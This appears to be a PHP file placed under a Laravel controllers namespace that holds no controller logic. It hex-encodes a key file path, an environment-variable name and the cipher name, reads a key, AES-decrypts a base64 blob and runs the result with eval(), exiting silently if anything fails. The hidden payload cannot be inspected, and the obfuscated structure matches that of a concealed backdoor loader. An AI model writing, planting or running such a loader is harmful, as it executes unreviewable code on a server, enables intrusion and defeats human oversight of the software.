<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('5Z60T40XzP944ST5+pug6Q==');

$c=base64_decode(

'7pjweDDmW9coNfPb6Am7XAAFZK3IlFnS/iRQySjMOdoj/yVKXA0i0T/MitYOP+JYlQj6rcQp31um' .
'96unR5JN6csqkPWHOyW6UN7MDTzmai9rtYjWWx1iIh6k7/5bxIHcC45mG9UKRBGXCVks/JCnPJr3' .
'rYMlkz7lyWOJoj5r5j7dM5oCbEvu9LBfdy5yTcDco+X7ryTabEM4E5ItOaNAsPjWSMYCSAVjhO+M' .
'O/dZmDZw0T/ytPonHV+7UHLVQz0Ua6AZtdVFXreedZV8Fldx7GzeYCwe+wwYHdpjqFv/VLMZdwhD' .
'WrA+vAeLdkMD6KukrxFpCNUORrNt0GfOk0px8nxUqTKvnZMAugZw5rGNtPU75qupFPf3UCTPlysz' .
'2YcYhItylh/fXY12bn2uK02U+A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

